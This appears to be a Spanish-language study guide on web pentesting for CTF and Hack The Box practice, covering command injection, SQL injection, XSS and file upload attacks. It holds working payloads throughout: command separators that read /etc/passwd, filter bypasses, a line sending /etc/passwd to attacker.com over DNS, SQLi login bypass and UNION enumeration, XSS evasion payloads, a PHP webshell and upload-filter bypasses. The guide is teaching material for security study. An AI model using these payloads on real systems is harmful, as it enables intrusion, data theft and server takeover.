# Web Security

La seguridad web es uno de los entornos más amplios en el hacking ofensivo. Este documento reúne tres pilares fundamentales del pentesting web —**inyecciones**, **XSS** y **file upload attacks**— explicados de forma técnica, narrativa y aplicada, basándome en todo el contenido de tus diapositivas.

El objetivo es tener un único recurso sólido para CTF, HTB, pruebas de intrusión y estudio general.

---

# 1. INTRODUCCIÓN A LAS INYECCIONES

Una inyección ocurre cuando una aplicación web mezcla datos del usuario dentro de una instrucción que se ejecutará en algún motor: SQL, shell, template engine, LDAP, etc.  
Cuando los datos no están correctamente validados, un atacante puede insertar *sus propias instrucciones*, alterando el comportamiento real del programa.

En otras palabras, la aplicación utiliza:

```
usuario_input = "algo"
comando = "haz X con " + usuario_input
```

Y el atacante convierte este input en:

```
algo ; haz_esto_otro
```

La clave no es “romper la aplicación”, sino **engañarla para que ejecute instrucciones adicionales**.

---

# 2. COMMAND INJECTION

Una “command injection” ocurre cuando el servidor ejecuta comandos del sistema operativo que incluyen directamente datos del usuario. Esto es común en herramientas web como *pings*, *traceroutes*, *verificadores de dominio*, *compresores*, *conversores* y scripts que llaman internamente a `system()`, `exec()`, `popen()`, etc.

## 2.1 Ejemplo típico: un IP Pinger

Una aplicación permite introducir una IP para hacer ping:

```
ping -c 4 8.8.8.8
```

Internamente:

```
system("ping -c 4 " + user_input);
```

El atacante introduce:

```
8.8.8.8 ; ls -la
```

La ejecución real es:

```
ping -c 4 8.8.8.8 ; ls -la
```

El segundo comando **sí se ejecuta**, porque el intérprete de comandos interpreta el `;` como un separador.

## 2.2 Riesgos

Una command injection implica la **máxima gravedad**, porque permite:

- Leer archivos del servidor (`cat /etc/passwd`)
- Modificar archivos o subir contenido
- Establecer reverse shells
- Exfiltrar base de datos
- Instalar malware
- Abrir puertas traseras persistentes

## 2.3 Concatenación de comandos

Símbolos útiles en Linux:

- `;` ejecuta múltiples comandos secuencialmente.
- `&&` ejecuta el segundo *solo si el primero tuvo éxito*.
- `||` ejecuta el segundo solo si el primero falla.
- `|` pipe.

Ejemplos reales:

```
8.8.8.8 ; whoami
8.8.8.8 && cat /etc/passwd
```

## 2.4 Bypass de filtros simples

### 1. Eliminar espacios → usando `${IFS}`

Si la aplicación filtra espacios:

```
cat${IFS}/etc/passwd
```

`${IFS}` es el separador interno de campos en Linux (space, tab, newline).

### 2. Filtros que bloquean palabras específicas

Si bloquean “cat”:

```
c""at /etc/passwd
c$a$t /etc/passwd
```

El intérprete expande dinámicamente.

### 3. Blind command injection

Si la respuesta no se imprime en la web, se usa *tiempo* como canal lateral:

```
8.8.8.8; sleep 5
```

Si la web tarda 5 segundos → inyecta.

### 4. Exfiltración por DNS

Send:

```
cat /etc/passwd | nslookup attacker.com
```

El atacante recibe los datos en DNS logs.

---

# 3. SQL INJECTION (SQLi)

SQL es el lenguaje para interactuar con bases de datos relacionales.  
Una vulnerabilidad SQLi aparece cuando parámetros del usuario se insertan directamente en una query.

Ejemplo inseguro:

```
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

El atacante puede terminar la instrucción o manipularla.

## 3.1 Login bypass

Entrada:

```
' OR 1=1 --
```

Query resultante:

```
SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='';
```

El `--` comenta el resto.  
`OR 1=1` siempre es cierto → login exitoso.

## 3.2 UNION-based SQLi

Permite combinar resultados de múltiples queries:

```
UNION SELECT 1,2,3
```

Requisitos:

- Número de columnas correcto
- Tipos compatibles

### Enumeración de esquema:

Bases de datos:

```
SELECT schema_name FROM information_schema.schemata;
```

Tablas:

```
SELECT table_name FROM information_schema.tables WHERE table_schema='db';
```

Columnas:

```
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

## 3.3 Localizar flags

Muchos CTF almacenan flags como:

```
table: flags
column: flag_value
```

```
UNION SELECT flag_value,2,3 FROM flags;
```

---

# 4. CROSS-SITE SCRIPTING (XSS)

XSS permite inyectar JavaScript arbitrario dentro del navegador de otro usuario.  
A diferencia de una inyección en el servidor, aquí el atacante compromete **a las víctimas**, no al servidor directamente.

Tres tipos principales:

---

## 4.1 Reflected XSS

El servidor refleja en la respuesta un parámetro sin sanitizar.

Ejemplo en URL:

```
/search?q=<script>alert(1)</script>
```

Si la página imprime el valor de `q` → ejecución del script.

---

## 4.2 Stored XSS

El payload se almacena en la base de datos y se ejecuta cada vez que otro usuario visita esa página.

Ejemplo:

```
Comentario: <img src=x onerror=alert(1)>
```

---

## 4.3 DOM-Based XSS

Ocurre completamente en el lado del cliente.  
El servidor no tiene la culpa: el JavaScript del navegador toma datos del usuario y los inserta en el DOM de forma insegura.

Ejemplo clásico:

```
document.write(location.hash);
```

URL:

```
#/ <img src=x onerror=alert(1)>
```

---

# 5. CONTEXTOS DE INYECCIÓN

No todas las inyecciones XSS se comportan igual. Depende del contexto:

### HTML:
```
"><script>alert(1)</script>
```

### Atributo HTML:
```
" onmouseover=alert(1) x="
```

### JavaScript embebido:
```
'; alert(1); //
```

### Dentro de JSON que será evaluado:
peligrosísimo si se usa `eval()`.

---

# 6. BYPASS AVANZADO DE FILTROS (XSS)

### 1. Payloads SVG:
```
<svg/onload=alert(1)>
```

### 2. Tags no comunes:
```
<math><maction xlink:href="javascript:alert(1)">CLICK
```

### 3. Codificación HTML/Unicode:
```
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

### 4. AngularJS exploit:
```
{{constructor.constructor('alert(1)')()}}
```

---

# 7. FILE UPLOAD VULNERABILITIES

Las funcionalidades de subida de archivos parecen inofensivas, pero pueden dar control completo al atacante si permiten subir contenido ejecutable o acceder al archivo subido.

## 7.1 Requisitos para explotación

Para explotar una subida de archivos necesitamos:

1. Poder subir archivos arbitrarios.  
2. Que el servidor guarde esos archivos en un directorio accesible mediante navegador.  
3. Que el archivo pueda interpretarse como código (PHP, ASP, JSP…).  

Si se cumplen esas condiciones → **webshell**.

---

## 7.2 Webshells

Ejemplo PHP:

```
<?php system($_GET['cmd']); ?>
```

Subido como:

```
shell.php
```

Luego:

```
/uploads/shell.php?cmd=id
```

---

# 7.3 Técnicas de bypass

### 1. Validación en frontend (inútil)
Solo revisa JS → fácil de saltar.

### 2. Validación por extensión
Se puede saltar:

```
shell.php.jpg
shell.php;1
shell.phP
```

### 3. Null byte injection
En PHP antiguos:

```
shell.php%00.jpg
```

El servidor interpreta solo `shell.php`.

### 4. MIME spoofing

Modificar en Burp:

```
Content-Type: image/jpeg
```

Subiendo contenido PHP igualmente.

### 5. Magic bytes

Ficheros PNG comienzan con:

```
89 50 4E 47
```

Podemos crear un archivo híbrido:

```
[magic bytes PNG][<?php ... ?>]
```

El servidor lo detecta como imagen → pero se ejecuta como PHP.

---

# 8. METODOLOGÍA GENERAL PARA WEB PENTESTING

1. Enumerar rutas (`ffuf`, `dirsearch`).  
2. Interceptar todo con Burp Suite.  
3. Modificar parámetros, fuzzear, probar inyecciones.  
4. Revisar respuesta y encabezados.  
5. Buscar funcionalidades peligrosas:  
   - login  
   - subida de archivos  
   - búsqueda  
   - paneles admin  
6. Revisar cookies, JWT, tokens.  
7. Automatizar enumeración SQLi, XSS, LFI, etc.  
8. Pivotar hacia RCE o shell.

---

# 9. RESUMEN FINAL

Este documento reúne todo el contenido de:

- **Inyecciones (Command Injection + SQLi)**  
- **XSS (Reflected, Stored, DOM, bypass)**  
- **File Upload Attacks (webshells, evasión de filtros)**  

Con un enfoque completamente práctico y orientado a CTF y pentesting real.

